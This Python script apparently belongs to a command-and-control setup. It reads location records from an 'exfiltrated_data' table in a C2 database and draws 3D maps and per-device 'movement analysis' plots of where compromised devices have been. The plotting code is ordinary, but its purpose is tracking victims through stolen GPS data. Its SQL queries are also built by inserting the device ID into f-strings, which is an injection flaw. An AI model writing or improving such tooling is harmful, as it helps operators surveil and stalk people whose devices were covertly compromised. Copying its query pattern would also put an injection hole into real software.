import os
import sqlite3
import pandas as pd
import plotly.graph_objects as go
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D
import json

DB_NAME = os.environ.get('C2_DB_NAME', '../c2/c2_data.db')
OUTPUT_HTML = os.environ.get('OUTPUT_3D_HTML', '3d_visualization.html')
OUTPUT_PNG = os.environ.get('OUTPUT_3D_PNG', '3d_plot.png')

def generate_3d_plot_interactive(device_id=None):
    """Generate interactive 3D plot using Plotly (HTML)."""
    conn = sqlite3.connect(DB_NAME)
    query = "SELECT device_id, data, timestamp FROM exfiltrated_data WHERE data LIKE '%lat%'"
    if device_id:
        query += f" AND device_id = '{device_id}'"
    df = pd.read_sql_query(query, conn)
    conn.close()
    if df.empty:
        print("No location data found.")
        return

    lats, lons, names, timestamps = [], [], [], []
    for _, row in df.iterrows():
        try:
            data = json.loads(row['data'])
            lats.append(data['lat'])
            lons.append(data['lon'])
            names.append(row['device_id'])
            timestamps.append(row['timestamp'])
        except:
            continue

    fig = go.Figure(data=[go.Scatter3d(
        x=lons,
        y=lats,
        z=list(range(len(lats))),
        mode='markers+text',
        marker=dict(size=8, color=lats, colorscale='Viridis', opacity=0.8),
        text=names,
        textposition="top center",
        customdata=timestamps,
        hovertemplate='<b>%{text}</b><br>Lat: %{y:.4f}<br>Lon: %{x:.4f}<br>Time: %{customdata}<extra></extra>'
    )])
    fig.update_layout(
        title="3D Device Network Visualization",
        scene=dict(
            xaxis_title='Longitude',
            yaxis_title='Latitude',
            zaxis_title='Device Index'
        )
    )
    fig.write_html(OUTPUT_HTML)
    print(f"Interactive 3D plot saved to {OUTPUT_HTML}")

def generate_3d_plot_static(device_id):
    """Generate static 3D plot using Matplotlib (PNG)."""
    conn = sqlite3.connect(DB_NAME)
    query = f"SELECT data, timestamp FROM exfiltrated_data WHERE device_id = '{device_id}' AND data LIKE '%lat%'"
    df = pd.read_sql_query(query, conn)
    conn.close()
    if df.empty:
        print(f"No location data for device {device_id}.")
        return

    lats, lons, times = [], [], []
    for _, row in df.iterrows():
        try:
            data = json.loads(row['data'])
            lats.append(data['lat'])
            lons.append(data['lon'])
            times.append(pd.to_datetime(row['timestamp']).timestamp())
        except:
            continue

    fig = plt.figure(figsize=(12, 8))
    ax = fig.add_subplot(111, projection='3d')
    sc = ax.scatter(lons, lats, times, c=times, cmap='viridis', s=30)
    ax.set_title(f'3D Movement Analysis: {device_id}')
    ax.set_xlabel('Longitude')
    ax.set_ylabel('Latitude')
    ax.set_zlabel('Timestamp')
    plt.colorbar(sc, label='Time')
    plt.savefig(OUTPUT_PNG, dpi=150)
    print(f"Static 3D plot saved to {OUTPUT_PNG}")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="Generate 3D visualizations of location data.")
    parser.add_argument("--device", help="Device ID to filter (optional)")
    parser.add_argument("--static", action="store_true", help="Generate static PNG instead of interactive HTML")
    args = parser.parse_args()

    if args.static and args.device:
        generate_3d_plot_static(args.device)
    else:
        generate_3d_plot_interactive(args.device)